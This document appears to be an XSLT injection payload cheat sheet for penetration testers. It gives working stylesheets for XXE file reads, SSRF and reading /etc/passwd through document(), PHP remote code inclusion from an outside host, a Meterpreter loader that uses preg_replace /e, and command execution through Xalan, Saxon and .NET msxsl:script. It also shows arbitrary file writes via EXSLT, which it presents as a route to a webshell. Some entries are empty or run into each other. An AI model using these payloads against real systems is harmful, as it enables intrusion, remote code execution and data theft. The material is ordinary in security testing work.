entries.title: What is XSLT injection
entries.body:
Processing an unvalidated XSL stylesheet lets an attacker change the structure and content of the resulting XML, include arbitrary files from the file system, or execute code.
Look for places where the application accepts or assembles .xsl / .xslt stylesheets: PDF generation, reports, XML export, rendering via xml-stylesheet.
There are practically no ready-made tools for exploiting XSLT - we work by hand.

entries.title: Detecting the vendor and version (via system-property)
entries.body:
Version:
Vendor:
Vendor URL:

meta.tip: First step: find out the vendor and version of the processor. The set of available techniques depends on this (PHP, Xalan/Java, Saxon, libxslt, .NET MSXML).

entries.title: Detecting the vendor via an HTML wrapper (xsl:version in html)
entries.body:
Version:
Vendor:
Vendor URL:

meta.tip: An XML document that includes the stylesheet via xml-stylesheet and triggers the transformation - this is how the XML + XSL pairing is tested.

entries.title: External Entity (XXE) inside XSLT
entries.body:
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE dtd_sample[<!ENTITY ext_file SYSTEM "C:\secretfruit.txt">]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/fruits">
    Fruits &ext_file;:
    <!-- Loop for each fruit -->
    <xsl:for-each select="fruit">
      <!-- Print name: description -->
      - <xsl:value-of select="name"/>: <xsl:value-of select="description"/>
    </xsl:for-each>
  </xsl:template>
</xsl:stylesheet>

meta.tip: Don't forget to check for XXE when you encounter XSLT files - DOCTYPE/ENTITY often remain available.

entries.title: File reading and SSRF via document()
entries.body:
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/fruits">
    <xsl:copy-of select="document('http://172.16.132.1:25')"/>
    <xsl:copy-of select="document('/etc/passwd')"/>
    <xsl:copy-of select="document('file:///c:/winnt/win.ini')"/>
    Fruits:
	    <!-- Loop for each fruit -->
    <xsl:for-each select="fruit">
      <!-- Print name: description -->
      - <xsl:value-of select="name"/>: <xsl:value-of select="description"/>
    </xsl:for-each>
  </xsl:template>
</xsl:stylesheet>

meta.tip: document() can reach over http (SSRF to internal hosts/ports) as well as over file:// or an absolute path (file reading).

entries.title: PHP - reading a file via readfile

meta.tip: If PHP runs with registerPHPFunctions, the php:function namespace calls arbitrary PHP functions. Start with readfile/scandir for reconnaissance.

entries.title: PHP - including a remote php file via assert
entries.body:
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
    <xsl:variable name="payload">
        include("http://10.10.10.10/test.php")
    </xsl:variable>
    <xsl:variable name="include" select="php:function('assert',$payload)"/>
</body>
</html>

entries.title: PHP - meterpreter via preg_replace /e
entries.body:
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
  <xsl:template match="/">
    <xsl:variable name="eval">
      eval(base64_decode('Base64-encoded Meterpreter code'))
    </xsl:variable>
    <xsl:variable name="preg" select="php:function('preg_replace', '/.*/e', $eval, '')"/>
  </xsl:template>
</xsl:stylesheet>

meta.tip: The /e modifier on preg_replace executes the replacement as PHP code (deprecated, but found on old versions of PHP < 7).

entries.title: PHP - writing a webshell via file_put_contents
Java/Xalan - command execution via java.lang.Runtime
entries.body:
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime" xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">
  <xsl:template match="/">
    <xsl:variable name="rtobject" select="rt:getRuntime()"/>
    <xsl:variable name="process" select="rt:exec($rtobject,'ls')"/>
    <xsl:variable name="processString" select="ob:toString($process)"/>
    <xsl:value-of select="$processString"/>
  </xsl:template>
</xsl:stylesheet>

meta.tip: Xalan-Java maps Java classes into namespaces of the form .../xalan/java/<fully.qualified.class.name>. This is how we reach Runtime.exec().

entries.title: Java/Saxon - command execution (XSLT 2.0)
entries.body:
<xml version="1.0"?>
<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:java="http://saxon.sf.net/java-type">
<xsl:template match="/">
<xsl:value-of select="Runtime:exec(Runtime:getRuntime(),'cmd.exe /C ping IP')" xmlns:Runtime="java:java.lang.Runtime"/>
</xsl:template>.
</xsl:stylesheet>

entries.title: .NET - msxsl:script (Process.Start)

meta.tip: MSXML/.NET allows embedding C# directly in msxsl:script. Inside the CDATA the whole System.Diagnostics.Process is available.

entries.title: .NET - msxsl:script with command output capture
entries.body:
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:msxsl="urn:schemas-microsoft-com:xslt"
xmlns:user="urn:my-scripts">

<msxsl:script language = "C#" implements-prefix = "user">
<![CDATA[
public string execute(){
System.Diagnostics.Process proc = new System.Diagnostics.Process();
proc.StartInfo.FileName= "C:\\windows\\system32\\cmd.exe";
proc.StartInfo.RedirectStandardOutput = true;
proc.StartInfo.UseShellExecute = false;
proc.StartInfo.Arguments = "/c dir";
proc.Start();
proc.WaitForExit();
return proc.StandardOutput.ReadToEnd();
}
]]>
</msxsl:script>

  <xsl:template match="/fruits">
  --- BEGIN COMMAND OUTPUT ---
	<xsl:value-of select="user:execute()"/>
  --- END COMMAND OUTPUT ---	
  </xsl:template>
</xsl:stylesheet>

entries.title: Writing a file via the EXSLT extension (exsl:document)
entries.body:
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
        xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:exploit="http://exslt.org/common"
    extension-element-prefixes="exploit"
    version="1.0">
<xsl:template match="/">

<exploit:document href="evil.txt" method="text">
        Hello World!
</exploit:document>

</xsl:template>
</xsl:stylesheet>

meta.tip: EXSLT is a set of XSLT extensions. The exsl:document element (http://exslt.org/common) can write arbitrary files to disk, which enables writing a webshell.
